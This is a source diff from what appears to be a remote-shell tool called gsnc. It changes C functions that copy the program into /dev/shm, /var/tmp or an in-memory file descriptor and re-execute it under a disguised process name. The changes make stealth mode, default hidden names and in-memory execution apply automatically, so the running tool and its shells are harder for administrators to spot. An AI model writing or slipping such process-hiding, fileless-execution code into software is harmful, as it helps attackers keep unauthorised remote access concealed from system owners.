@@ -136,10 +136,10 @@ execveat(int fd, const char *pathname, char *const argv[], char *const *envp, in
 #endif
 
 static int
-try_memexecme(int src, char *argv[]) {
+try_memexecme(const char *hidden_name,int src, char *argv[]) {
 #if defined(HAVE_SYS_MMAN_H) && defined(HAVE_MEMFD_CREATE) && defined(HAVE_EXECVEAT) && defined(MFD_CLOEXEC)
 	int fd;
-	if ((fd = memfd_create(gopt.proc_hiddenname, MFD_CLOEXEC)) < 0)
+	if ((fd = memfd_create(hidden_name, MFD_CLOEXEC)) < 0)
 		return -1;
 
 	if (cpy(fd, src) == 0)
@@ -151,14 +151,14 @@ try_memexecme(int src, char *argv[]) {
 
 // Copy myself into $dir/$gopt.proc_hiddenname and try to execute myself.
 static int
-try_cpexecme(const char *dir, int src, char *argv[]) {
+try_cpexecme(const char *hidden_name, const char *dir, int src, char *argv[]) {
 	int dst = -1;
 	int ret;
-	char *ptr;
+	const char *ptr;
 
 	char fn[512];
-	if ((ptr = strrchr(gopt.proc_hiddenname, '/')) == NULL)
-		ptr = gopt.proc_hiddenname;
+	if ((ptr = strrchr(hidden_name, '/')) == NULL)
+		ptr = hidden_name;
 	snprintf(fn, sizeof fn, "%s/%s", dir, ptr);
 	if ((dst = open(fn, O_WRONLY | O_CREAT | O_CLOEXEC, S_IRWXU)) < 0)
 		return -1;
@@ -182,21 +182,19 @@ static int
 try_execme(char *exename, char *argv[]) {
 	int src;
 	char *old_argv0 = argv[0];
-
-	if (gopt.proc_hiddenname == NULL)
-		return -1;
+	char *hidden_name = gopt.proc_hiddenname?:GSNC_PROC_HN_SIGTERM;
 
 	if ((src = open(exename, O_RDONLY | O_CLOEXEC)) < 0)
 		return -1;
 
-	argv[0] = gopt.proc_hiddenname;
+	argv[0] = hidden_name;
 	
 	if (gopt.flags & GSC_FL_MEMEXEC) {
 		unsetenv("GS_NOMEMEXEC");
-		try_memexecme(src, argv);
+		try_memexecme(hidden_name, src, argv);
 	}
-	try_cpexecme("/dev/shm", src, argv);
-	try_cpexecme("/var/tmp", src, argv);
+	try_cpexecme(hidden_name, "/dev/shm", src, argv);
+	try_cpexecme(hidden_name, "/var/tmp", src, argv);
 
 	argv[0] = old_argv0;
 	XCLOSE(src);
@@ -568,14 +566,7 @@ try_changeargv0(int argc, char *argv[]) {
 	try_systemd_run();
 
 	if (GSNC_config_read_any(argv[0]) != 0) {
-		// if (GS_GETENV2("SHOW_RUNNING"))
-			// exit(255);
 		// Even without config, maybe ENV was set => CONTINUE. Otherwise, we would not be able to start gsnc without config.
-	}
-
-	if (gopt.proc_hiddenname == NULL) {
-		DEBUGF("Config has no GS_PROC_HIDDENNAME.\n");
-		goto done; // Don't want to change argv0
 	}
 
 	if (!(gopt.flags & GSC_FL_REEXEC))
@@ -594,7 +585,7 @@ try_changeargv0(int argc, char *argv[]) {
 		goto done;
 
 	// Otherwise, modify my argv[0]
-	argv[0] = gopt.proc_hiddenname;
+	argv[0] = gopt.proc_hiddenname?:GSNC_PROC_HN_SIGTERM;
 
 	execv(myself_exe, argv);
 	DEBUGF("execv()=%s\n", strerror(errno));
@@ -672,10 +663,14 @@ init_defaults1(int argc, char *argv[]) {
 	gopt.flags |= GSC_FL_IS_STEALTH;
 #endif
 	if ((ptr = GS_GETENV2("STEALTH")) != NULL) {
-		gopt.flags |= GSC_FL_IS_STEALTH;
 		// Set GS_STEALTH=0 to disable stealth.
-		if (*ptr == '0')
-			gopt.flags &= ~GSC_FL_IS_STEALTH;
+		if (*ptr != '0')
+			gopt.flags |= GSC_FL_IS_STEALTH;
+	}
+	if (gopt.flags & GSC_FL_IS_STEALTH) {
+		// DEFAULTS for stealth mode:
+		gopt.flags |= GSC_FL_REEXEC;
+		gopt.flags |= GSC_FL_MEMEXEC;
 	}
 	signal(SIGPIPE, SIG_IGN);
 	signal(SIGCHLD, SIG_IGN);	// no defunct childs please
@@ -725,7 +720,8 @@ init_defaults1(int argc, char *argv[]) {
 		gopt.flags |= GSC_FL_CHANGE_CGROUP;
 	}
 
-	gopt.flags |= GSC_FL_MEMEXEC;
+	if (GS_getenv("GS_MEMEXEC"))
+		gopt.flags |= GSC_FL_MEMEXEC; // needed if not in stealth mode
 	if (GS_getenv("GS_NOMEMEXEC"))
 		gopt.flags &= ~GSC_FL_MEMEXEC;
 
@@ -740,7 +736,9 @@ init_defaults1(int argc, char *argv[]) {
 		gopt.proc_hiddenname = strdup(ptr);
 
 	if (GS_getenv("GS_REEXEC") != NULL)
-		gopt.flags |= GSC_FL_REEXEC;
+		gopt.flags |= GSC_FL_REEXEC; // needed if not in stealth mode
+	if (GS_getenv("GS_NOREEXEC") != NULL)
+		gopt.flags &= ~GSC_FL_REEXEC;
 
 	// if ((ptr == GS_getenv("GS_EXENAME")) != NULL) {
 	// 	gopt.prg_exename = strdup(ptr);
@@ -1514,7 +1512,7 @@ mk_shellname(const char *shell, char *shell_name, ssize_t len, const char **prgn
 		// Set PRGNAME unless it's a link (BusyBox etc), which relies on the original argv0
 		if (lstat(shell, &st) == 0) {
 			if (!S_ISLNK(st.st_mode))
-				*prgname = gopt.proc_hiddenname; // HIDE as prg_name
+				*prgname = gopt.proc_hiddenname?:GSNC_PROC_HN_SIGTERM; // HIDE as prg_name
 		}
 	}
 	
